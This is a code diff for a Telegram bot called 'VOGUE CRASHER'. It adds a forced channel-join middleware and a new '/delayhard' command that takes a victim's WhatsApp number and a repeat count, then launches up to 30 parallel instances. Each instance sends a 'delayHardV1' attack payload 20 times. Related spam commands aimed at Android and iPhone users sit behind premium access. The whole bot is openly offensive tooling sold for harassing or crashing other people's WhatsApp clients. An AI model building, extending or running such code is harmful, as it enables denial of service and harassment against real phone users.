@@ -107,7 +107,6 @@ let restarting = false;
 const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
 const requiredChannel = "@VogueXChannel";
-const REQUIRED_CHANNEL = "@VogueXChannel";
 const premiumFile = './database/premium.json';
 const premiumGroupFile = './database/premiumgroup.json';
 const claimFile = './database/premium_claimed.json';
@@ -261,29 +260,6 @@ Restarting process...
     }
 }
 
-async function checkChannelJoin(ctx) {
-    try {
-
-        const userId = ctx.from.id;
-
-        const member = await ctx.telegram.getChatMember(
-            REQUIRED_CHANNEL,
-            userId
-        );
-
-        const status = member.status;
-
-        return (
-            status === "member" ||
-            status === "administrator" ||
-            status === "creator"
-        );
-
-    } catch (err) {
-        console.log(err);
-        return false;
-    }
-}
 
 const startSesi = async () => {
     console.clear();
@@ -439,38 +415,6 @@ const checkWhatsAppConnection = (ctx, next) => {
     next();
 };
 
-const requireJoinChannel = async (ctx, next) => {
-
-    const joined = await checkChannelJoin(ctx);
-
-    if (!joined) {
-
-        return ctx.reply(
-            "You need to join our channel first to continue.",
-            {
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            {
-                                text: "📢 Join Channel",
-                                url: `https://t.me/${REQUIRED_CHANNEL.replace("@", "")}`
-                            }
-                        ],
-                        [
-                            {
-                                text: "🔄 Verify",
-                                callback_data: "check_join"
-                            }
-                        ]
-                    ]
-                }
-            }
-        );
-    }
-
-    return next();
-};
-
 const checkPremium = (ctx, next) => {
     if (!isPremiumUser(ctx.from.id)) {
         ctx.reply("❌ ☇ Akses hanya untuk premium");
@@ -482,6 +426,175 @@ const checkPremium = (ctx, next) => {
 // ==========================================
 // HOME PAGE START BOT
 // ==========================================
+
+// ========================================
+// REQUIRED CHANNEL SYSTEM
+// ========================================
+
+const REQUIRED_CHANNELS = [
+    "@VogueXChannel"
+];
+
+async function checkChannelMembership(ctx) {
+
+    try {
+
+        const notJoined = [];
+
+        for (const channel of REQUIRED_CHANNELS) {
+
+            try {
+
+                const member =
+                    await ctx.telegram.getChatMember(
+                        channel,
+                        ctx.from.id
+                    );
+
+                const status = member.status;
+
+                const allowed = [
+                    "creator",
+                    "administrator",
+                    "member"
+                ];
+
+                if (!allowed.includes(status)) {
+                    notJoined.push(channel);
+                }
+
+            } catch {
+
+                notJoined.push(channel);
+            }
+        }
+
+        if (notJoined.length > 0) {
+
+            const buttons = [];
+
+            // CHANNEL BUTTONS
+            for (const channel of REQUIRED_CHANNELS) {
+
+                buttons.push([
+                    {
+                        text: `Join ${channel}`,
+                        url: `https://t.me/${channel.replace("@", "")}`
+                    }
+                ]);
+            }
+
+            // CHECK BUTTON
+            buttons.push([
+                {
+                    text: "I've Joined",
+                    callback_data: "recheck_join"
+                }
+            ]);
+
+            await ctx.replyWithPhoto(
+                thumbnailUrl,
+                {
+                    caption:
+`<pre>
+V O G U E  •  V E R I F I C A T I O N
+──────────────────────────
+
+Access Denied
+
+Before using this bot,
+you must join all required
+Telegram channels first.
+
+Required Channels:
+
+${REQUIRED_CHANNELS.join("\n")}
+
+──────────────────────────
+After joining all channels,
+press the verification button below.
+</pre>`,
+                    parse_mode: "HTML",
+
+                    reply_markup: {
+                        inline_keyboard: buttons
+                    }
+                }
+            );
+
+            return false;
+        }
+
+        return true;
+
+    } catch (err) {
+
+        console.log(
+            `[JOIN CHECK ERROR] ${err.message}`
+        );
+
+        return false;
+    }
+}
+
+// ========================================
+// GLOBAL MIDDLEWARE
+// ========================================
+
+bot.use(async (ctx, next) => {
+
+    if (ctx.from?.id == ownerID) {
+        return next();
+    }
+
+    if (!ctx.from) {
+        return;
+    }
+
+    const allowed =
+        await checkChannelMembership(ctx);
+
+    if (!allowed) {
+        return;
+    }
+
+    return next();
+});
+
+bot.action(
+    "recheck_join",
+    async (ctx) => {
+
+        const allowed =
+            await checkChannelMembership(ctx);
+
+        if (allowed) {
+
+            await ctx.answerCbQuery(
+                "Verification successful"
+            );
+
+            try {
+
+                await ctx.deleteMessage();
+
+            } catch {}
+
+            return ctx.reply(
+`Access Granted
+
+You can now use the bot normally.`
+            );
+        }
+
+        return ctx.answerCbQuery(
+            "You have not joined all channels yet",
+            {
+                show_alert: true
+            }
+        );
+    }
+);
 
 
 bot.start(async (ctx) => {
@@ -543,7 +656,7 @@ bot.action("check_join", async (ctx) => {
 });
 
 
-bot.action('/start', requireJoinChannel, async (ctx) => {
+bot.action('/start', async (ctx) => {
 
     const menuMessage = `
 <pre>
@@ -834,8 +947,9 @@ Prefix      : /
 ──────────────────────────
 
 A N D R O I D
-/spamandro  : Hard Delay 100%
-/hardspam   : Delay Hard 9000%
+/spamandro  : Hard Delay Invisible 70%
+/hardspam   : Delay Hard Invisible 1000%
+/delayhard  : Delay Hard Invisible  100%
 
 ──────────────────────────
 
@@ -934,7 +1048,7 @@ Official Build by VOGUE CRASHER
 // COMMAND SENDER
 // ==========================================
 
-bot.command("reqpair", requireJoinChannel, async (ctx) => {
+bot.command("reqpair", async (ctx) => {
     if (ctx.from.id != ownerID) {
         return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
     }
@@ -2099,26 +2213,40 @@ been successfully analyzed.
 // ALL BUG COMMAND
 // ==========================================
 
-bot.command('testnew', checkWhatsAppConnection, checkPremiumAccess, requireJoinChannel, async (ctx) => {
+bot.command('delayhard', checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
     
-    let q = ctx.message?.text?.split(" ")[1];
+    let args = ctx.message?.text?.split(" ");
+    
+    let q = args[1];
+    
+    let executionCount =
+        parseInt(args[2]) || 1;
+    
+    if (executionCount > 30) {
+        executionCount = 30;
+    }
     
     if (!q) return ctx.reply(
         `Invalid Format
 
 Usage:
-/spamandro <target_number>
+/delayhard <target_number> <amount>
 
 Example:
-/spamandro 628xxxxxxxx`
+/delayhard 628xxxxxxxx 50`
     );
     
-    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    let target =
+        q.replace(/[^0-9]/g, "") +
+        "@s.whatsapp.net";
     
     try {
         
-        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
-            caption: `
+        const sent =
+            await ctx.replyWithPhoto(
+                thumbnailUrl,
+                {
+                    caption: `
 <pre>
 V O G U E  •  C R A S H E R
 ──────────────────────────
@@ -2126,41 +2254,88 @@ V O G U E  •  C R A S H E R
 EXECUTION STATUS
 
 Target      : ${q}
-Status      : Success
+Execution   : ${executionCount}x
+Status      : Active
 
 ──────────────────────────
+Dispatch engine initialized.
 </pre>`,
-            parse_mode: "HTML",
-            reply_markup: {
-                inline_keyboard: [
-                    [{
-                        text: "Check Target",
-                        url: `https://wa.me/${q}`,
-                        style: "primary"
-                    }]
-                ]
-            }
-        });
+                    parse_mode: "HTML",
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                {
+                                    text: "Check Target",
+                                    url: `https://wa.me/${q}`,
+                                    style: "primary"
+                                }
+                            ]
+                        ]
+                    }
+                }
+            );
         
         (async () => {
-            
-            const instanceId = Date.now() + Math.random();
-            
-            for (let i = 0; i < 10; i++) {
+
+            const instanceBase = Date.now();
+        
+            const totalInstances = executionCount;
+        
+            const createInstance = async (instanceIndex) => {
+        
+                const instanceId = `${instanceBase}-${instanceIndex}`;
+        
                 try {
-                    if (!sock) {
-                        throw new Error("Socket unavailable");
+        
+                    for (let i = 0; i < 20; i++) {
+        
+                        try {
+        
+                            if (!sock) {
+                                throw new Error("Socket unavailable");
+                            }
+        
+                            await delayHardV1(sock, target);
+                            await sleep(1000)
+        
+                            console.log(
+                                `[INSTANCE ${instanceId}] Exec ${i + 1}/20`
+                            );
+        
+                        } catch (e) {
+        
+                            console.log(
+                                `[INSTANCE ${instanceId}] Error: ${e.message}`
+                            );
+        
+                            autoRestartOn408(e);
+                        }
                     }
-                    await delayHardV1(sock, target);
-                    await sleep(1000)
-                } catch (e) {
-                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
-                    autoRestartOn408(e);
+        
+                    console.log(
+                        `[INSTANCE ${instanceId}] DONE`
+                    );
+        
+                } catch (err) {
+        
+                    console.log(
+                        `[INSTANCE ${instanceId}] FAILED: ${err.message}`
+                    );
                 }
-            }
-            
-            console.log(`[WORKER ${instanceId}] Done for ${q}`);
-            
+            };
+        
+            // 🔥 BANGUN SEMUA INSTANCE SEKALIGUS
+            const allInstances = Array.from(
+                { length: totalInstances },
+                (_, i) => createInstance(i + 1)
+            );
+        
+            await Promise.allSettled(allInstances);
+        
+            console.log(
+                `[SYSTEM] All ${totalInstances} instances completed`
+            );
+        
         })();
         
     } catch (error) {
@@ -2172,11 +2347,13 @@ The system was unable to execute the requested module.
 Please verify the target input and system status before retrying.`
         );
         
-        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
+        console.log(
+            `[VOGUE CRASHER] Execution failed for ${q}`
+        );
     }
 });
 
-bot.command('spamandro', checkWhatsAppConnection, checkPremiumAccess, requireJoinChannel, async (ctx) => {
+bot.command('spamandro', checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
     
     let q = ctx.message?.text?.split(" ")[1];
     
@@ -2254,7 +2431,7 @@ Please verify the target input and system status before retrying.`
     }
 });
 
-bot.command('hardspam', requireJoinChannel, checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
+bot.command('hardspam', checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
     
     let args = ctx.message?.text?.split(" ");
     
@@ -2394,7 +2571,7 @@ Please verify the target input and system status before retrying.`
     }
 });
 
-bot.command('spamiphone', requireJoinChannel, checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
+bot.command('spamiphone', checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
     
     let q = ctx.message?.text?.split(" ")[1];
     
